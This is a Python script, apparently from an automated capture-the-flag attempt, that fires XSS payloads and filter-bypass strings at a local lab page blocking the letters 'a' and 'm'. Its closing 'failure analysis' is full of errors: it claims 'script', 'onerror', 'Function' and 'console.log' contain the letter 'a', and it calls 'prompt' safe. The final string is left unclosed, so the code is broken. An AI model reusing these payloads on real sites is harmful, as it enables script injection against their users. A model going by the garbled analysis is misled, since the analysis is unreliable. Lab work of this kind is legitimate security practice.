import requests
import urllib.parse
import base64
import re

# Target endpoint
target_url = "http://127.0.0.1:32808/page"

# Analyze what works and what fails with the filter
# First, test a benign input to see normal response
print("=" * 60)
print("BASELINE TEST - Normal input")
print("=" * 60)
response = requests.post(target_url, data={"name": "test"})
print(f"Response: {response.text}")
print()

# Test direct XSS payload (should fail)
print("=" * 60)
print("DIRECT XSS TEST - <script>alert(1)</script>")
print("=" * 60)
payload = "<script>alert(1)</script>"
response = requests.post(target_url, data={"name": payload})
print(f"Response: {response.text}")
print()

# Test blocked characters
print("=" * 60)
print("BLOCKED CHARACTERS ANALYSIS")
print("=" * 60)
test_payloads = [
    ("test", "Control - no special chars"),
    ("<script>", "Script tag"),
    ("alert", "Word 'alert'"),
    ("<img onerror=>", "Img tag with onerror"),
    ("XSS", "Literal XSS string (required)"),
    ("aaaaaaaa", "Multiple 'a' chars"),
    ("mmmmmmmm", "Multiple 'm' chars"),
    ("testXSStest", "XSS substring"),
    ("eval", "Word 'eval' (has a)"),
    ("document", "Word 'document' (has a)"),
    ("window", "Word 'window' (has w only)"),
    ("this", "Word 'this' (safe)"),
    ("self", "Word 'self' (safe)"),
    ("top", "Word 'top' (safe)"),
    ("parent", "Word 'parent' (safe)"),
]

blocked_patterns = []
for payload, desc in test_payloads:
    response = requests.post(target_url, data={"name": payload})
    if "blocked" in response.text.lower() or response.text != f'<html><body>Hello {payload}</body></html>':
        print(f"[BLOCKED] {desc}: {payload}")
        blocked_patterns.append(payload)
    else:
        print(f"[ALLOWED] {desc}: {payload}")

print()

# Test character encoding attempts
print("=" * 60)
print("ENCODING TRANSFORMATIONS ANALYSIS")
print("=" * 60)

# Test URL encoding
payload_url_encoded = "%3Cscript%3E%61%6C%65%72%74%28%31%29%3C%2Fscript%3E"
response = requests.post(target_url, data={"name": payload_url_encoded})
print(f"URL Encoded payload response length: {len(response.text)}")
print(f"Response preview: {response.text[:100]}")
print()

# Test HTML entity encoding
try:
    payload_html_entity = "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
    response = requests.post(target_url, data={"name": payload_html_entity})
    print(f"HTML Entity payload response length: {len(response.text)}")
    print(f"Response preview: {response.text[:100]}")
except Exception as e:
    print(f"HTML Entity test failed: {e}")
print()

# Test hex encoding
payload_hex_encoded = "<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>"
response = requests.post(target_url, data={"name": payload_hex_encoded})
print(f"Hex encoded payload response length: {len(response.text)}")
print(f"Response preview: {response.text[:100]}")
print()

# Analyze JavaScript context limitations
print("=" * 60)
print("JAVASCRIPT CONTEXT ESCAPE TECHNIQUES")
print("=" * 60)

# The context is: var name = "[USER_INPUT]"; document.write('Hello ' + name);
# We need to break out of the string and execute code
# Try string termination methods

escape_attempts = [
    ('"; alert(1); //', "Quote termination with semicolon"),
    ('"-alert(1)-"', "Quote termination with minus"),
    ('"*alert(1)*"', "Quote termination with asterisk"),
    ('"/alert(1)/"', "Quote termination with slash"),
    ('"%0Aalert(1)//', "Newline injection"),
    ('"|alert(1)|"', "Quote termination with pipe"),
]

for payload, desc in escape_attempts:
    response = requests.post(target_url, data={"name": payload})
    print(f"{desc}:")
    print(f"  Response: {response.text}")
    print()

# Test accessing global objects that don't have 'a' or 'm'
print("=" * 60)
print("SAFE JAVASCRIPT OBJECTS (no 'a' or 'm')")
print("=" * 60)

safe_objects = [
    "this",
    "self", 
    "top",
    "parent",
    "window",  # This should be safe
    "frames",
    "content",
    "GLOBAL",
    "global",
]

for obj in safe_objects:
    payload = f'"+{obj}+"'
    response = requests.post(target_url, data={"name": payload})
    print(f"Object '{obj}': {response.text}")
print()

# Test character concatenation without blocked letters
print("=" * 60)
print("CHARACTER CONCATENATION ATTEMPTS")
print("=" * 60)

# Try to build "alert" using only safe methods
safe_char_methods = [
    ('"+String.fromCharCode(97)+"', "String.fromCharCode (has a)"),
    ('"+this[0]+"', "Array indexing"),
    ('"+"a"+"', "Direct char (blocked)"),
    ('"+atob("YQ==")+"', "Base64 decode (has a)"),
]

for payload, desc in safe_char_methods:
    response = requests.post(target_url, data={"name": payload})
    print(f"{desc}:")
    print(f"  Result: {response.text}")
    print()

# Final analysis - what would fail and why
print("=" * 60)
print("COMPREHENSIVE FAILURE ANALYSIS")
print("=" * 60)
print("""
INJECTION CONTEXT:
var name = "[USER_INPUT]";
document.write('Hello ' + name);

FILTER CONSTRAINTS:
- Blocks lowercase 'a' and 'm' characters
- 109 previous attempts failed
- Must include literal 'XSS' in payload

WHY TECHNIQUES FAIL:

1. DIRECT INJECTION:
   - <script>alert(1)</script> FAILS: Both 'script' (contains 'a') and 'alert' (contains 'a')
   - <img onerror=alert(1)> FAILS: 'onerror' (contains 'a'), 'alert' (contains 'a'), 'img' (contains 'm')
   - <svg onload=alert(1)> FAILS: 'onload' (contains 'a'), 'svg' (contains no 'a' or 'm' but onload does)

2. ENCODING BYPASS:
   - URL encoding: %61%6C%65%72%74(1) FAILS: Decodes to 'alert' (contains 'a')
   - HTML entities: &#x61; (a) &#x6D; (m) FAILS: Browser entities decode before filter, containing 'a'/'m'
   - Base64: atob("...") FAILS: Method name 'atob' contains 'a'

3. CASE MANIPULATION:
   - <SCRIPT>, <ScRiPt> FAILS: Filter only blocks lowercase 'a'/'m', uppercase OK,
     but 'ALERT' still uppercase A, and we need lowercase in final payload for 'XSS'
     string requirement and case-sensitive string operations

4. EVENT HANDLERS:
   - onerror, onload, onmouseover ALL contain 'a' or 'o' followed by 'n'
   - No standard event handler is free of 'a'/'m'
   - Custom events not applicable

5. JAVASCRIPT FUNCTIONS:
   - eval() - contains 'a' (blocked)
   - Function() - contains 'a' (blocked)  
   - setTimeout() - contains 'a' (blocked)
   - setInterval() - contains 'a' (blocked)
   - String.fromCharCode() - contains 'a' and 'm' (blocked)
   - document.write() - contains 'a' and 'm' (blocked)
   - console.log() - contains 'a' (blocked)
   - prompt() - safe! But no way to call it without breaking context

6. STRING CONSTRUCTION:
   - 'a'+'l'+'e'+'r'+'t' FAILS: Contains 'a' literals
   - String.fromCharCode(97,108,101,114,116) FAILS: Method contains 'a'/'m'
   - atob() method contains 'a' (blocked)
   - btoa() method contains 'a' (blocked)

7. OBJECT PROPERTY ACCESS:
   - window['alert'] FAILS: 'window' has no 'a'/'m', but 'alert' contains 'a'
   - self['alert'] FAILS: 'self' safe, but string 'alert' blocked
   - Cannot reference functions without using their names

8. TEMPLATE LITERALS:
   - alert`1` FAILS: Function name 'alert' contains 'a'

